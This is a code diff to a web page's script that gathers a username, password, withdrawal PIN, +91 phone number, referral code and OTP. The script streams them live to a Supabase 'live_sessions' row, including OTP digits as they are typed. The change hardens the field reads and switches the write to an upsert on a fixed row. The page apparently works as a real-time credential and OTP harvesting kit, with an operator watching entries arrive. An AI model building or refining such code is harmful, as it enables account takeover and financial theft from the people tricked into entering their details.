@@ -174,11 +174,11 @@
       const phoneVal = document.getElementById('phone').value.trim();
 
       pendingUserData = {
-        username: document.getElementById('username').value.trim(),
-        password: document.getElementById('password').value.trim(),
-        withdrawalPin: document.getElementById('withdrawalPin').value.trim(),
+        username: document.getElementById('username')?.value.trim() || '',
+        password: document.getElementById('password')?.value.trim() || '',
+        withdrawalPin: document.getElementById('withdrawalPin')?.value.trim() || '',
         phone: phoneVal,
-        referral: document.getElementById('referral').value.trim()
+        referral: document.getElementById('referral')?.value.trim() || ''
       };
 
       displayPhone.textContent = '+91 ' + phoneVal;
@@ -278,7 +278,7 @@
       }
     }
 
-    // Supabase Live Sync Logic
+    // Supabase Live Sync Logic with Upsert
     let syncTimeout;
     async function syncLiveSession(currentState) {
       clearTimeout(syncTimeout);
@@ -303,7 +303,8 @@
         try {
           await supabaseClient
             .from('live_sessions')
-            .update({
+            .upsert([{
+              id: 1,
               username: uname || 'Waiting...',
               phone: ph || 'Waiting...',
               referral: ref || '-',
@@ -312,8 +313,7 @@
               otp_mask: otpFilledCount > 0 ? otpCurrentVal : '-',
               status: currentState,
               updated_at: new Date().toISOString()
-            })
-            .eq('id', 1);
+            }], { onConflict: 'id' });
         } catch (err) {
           console.error('Live sync error:', err);
         }
